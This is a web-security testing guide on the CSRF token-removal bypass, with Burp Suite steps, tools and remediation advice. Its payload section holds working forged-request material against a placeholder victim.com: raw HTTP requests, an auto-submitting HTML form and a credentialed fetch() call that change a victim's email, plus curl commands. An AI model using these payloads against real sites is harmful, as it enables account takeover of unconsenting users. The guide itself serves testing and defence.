# CSRF Token Bypass — Token Removal

## Overview
Many applications implement CSRF protection by including a token in forms and validating it server-side. However, a common implementation flaw is that the server only validates the token if it is present in the request — if the token parameter is simply omitted entirely, the server skips validation and processes the request. This "conditional validation" pattern means the CSRF protection can be completely defeated by removing the token parameter from the request, making it as vulnerable as an application with no CSRF protection at all.

## How It Works
The application's server-side CSRF validation code typically follows a logic pattern like: "If a CSRF token is present in the request, compare it against the session token; if they match, proceed." The flaw is the conditional: if no token is in the request, the else-branch is missing and the code falls through to process the action. This occurs because developers may test "does the token match?" but forget to test "is a token present at all?" A simple `if (request.csrf_token == session.csrf_token)` check is vacuously true if both are null/empty.

## Impact
- Complete bypass of CSRF protection despite its presence
- All state-changing actions executable via forged cross-site requests
- Equivalent to having no CSRF protection at all
- Account takeover, data modification, privilege escalation

## Where to Look
- Any form with a CSRF token field — test by removing the field entirely
- API endpoints that include a CSRF token in request headers
- Single-page applications using `X-CSRF-Token` headers
- AJAX requests that include `csrf_token` in the JSON body
- Requests where the CSRF token is in a cookie AND a body parameter (double-submit pattern) — test removing the body parameter

## Testing Steps
1. Log into the application and capture a legitimate state-changing request with its CSRF token using Burp Proxy.
2. Send the request to Burp Repeater.
3. Delete the CSRF token parameter entirely from the request (both name and value).
4. Resend the request and check if it succeeds (HTTP 200 with success response, or the state actually changes).
5. Also test removing just the token value (keep `csrf_token=` with empty value).
6. Test changing the token to a completely different value to rule out the bypass being about the empty-value case.
7. If using `X-CSRF-Token` header, remove the header entirely.
8. If CSRF token appears in JSON body, remove the key from the JSON object.
9. Confirm the bypass by building a PoC form without any CSRF token field and verifying it executes the action.

## Payloads / Techniques

**Legitimate request (with token):**
```http
POST /account/change-email HTTP/1.1
Host: victim.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=user@example.com&csrf_token=a1b2c3d4e5f6
```

**Token removal bypass (no token parameter):**
```http
POST /account/change-email HTTP/1.1
Host: victim.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com
```

**Token empty value bypass:**
```http
POST /account/change-email HTTP/1.1
Host: victim.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com&csrf_token=
```

**Header-based token removal:**
```http
POST /api/user/update HTTP/1.1
Host: victim.com
Cookie: session=abc123
Content-Type: application/json

{"email": "attacker@evil.com"}
```
(No `X-CSRF-Token` header present)

**CSRF PoC HTML without CSRF token field:**
```html
<!DOCTYPE html>
<html>
<body>
<form id="pwn" method="POST" action="https://victim.com/account/change-email">
  <!-- Note: no csrf_token field — testing removal bypass -->
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('pwn').submit();</script>
</body>
</html>
```

**JSON body without CSRF token:**
```html
<script>
fetch('https://victim.com/api/account/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({"email": "attacker@evil.com"})
  // No csrf_token in the body
});
</script>
```

**cURL test for token removal:**
```bash
# Original with token:
curl -X POST https://victim.com/account/change-email \
     -H 'Cookie: session=abc123' \
     -d 'email=test@test.com&csrf_token=VALIDTOKEN'

# Bypass — no token:
curl -X POST https://victim.com/account/change-email \
     -H 'Cookie: session=abc123' \
     -d 'email=attacker@evil.com'
```

## Burp Suite Tips
- **Burp's CSRF PoC generator** creates forms without CSRF tokens by default — use "Engagement Tools" > "Generate CSRF PoC" on any POST request to test removal immediately.
- In **Repeater**, select the CSRF token parameter, right-click and use "Delete parameter" to remove it cleanly, then resend.
- Use **Burp's Active Scanner** — one of its CSRF checks is specifically removal testing; it will flag the vulnerability automatically.
- Create a **Burp macro** that automatically removes the CSRF token parameter from all outgoing POST requests, then run the scanner with it to test multiple endpoints at once.
- In **HTTP history**, use the "Search" feature to find all parameters named `csrf`, `token`, `_token`, `xsrf` across all POST requests.
- Use **Param Miner** extension to discover hidden CSRF parameters that might not be obvious.

## Tools
- Burp Suite Pro (CSRF PoC Generator, Scanner, Repeater)
- XSRFProbe — https://github.com/0xInfection/XSRFProbe (automated CSRF testing including removal)
- OWASP ZAP (Active Scanner)
- curl (for quick manual tests)

## Remediation
- **Validate unconditionally**: The server-side CSRF check must reject ANY request that does NOT include a valid token — treat absent token and invalid token identically (reject both).
- **Server-side implementation example (Python/Flask):**
```python
def validate_csrf():
    token = request.form.get('csrf_token')
    if not token:  # Explicit check for absence
        abort(403, 'CSRF token missing')
    if not hmac.compare_digest(token, session.get('csrf_token', '')):
        abort(403, 'CSRF token invalid')
```
- **Framework defaults**: Use your framework's built-in CSRF protection (Django's `{% csrf_token %}`, Laravel's `@csrf`, Rails' `protect_from_forgery`) — these reject requests without tokens by default.
- **Automated tests**: Add a test case that verifies removing the CSRF token from state-changing requests causes a 403 response.
- **SameSite cookies**: Use `SameSite=Lax` or `Strict` as a complementary layer.

## References
https://portswigger.net/web-security/csrf/bypassing-csrf-defences
https://owasp.org/www-community/attacks/csrf
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session
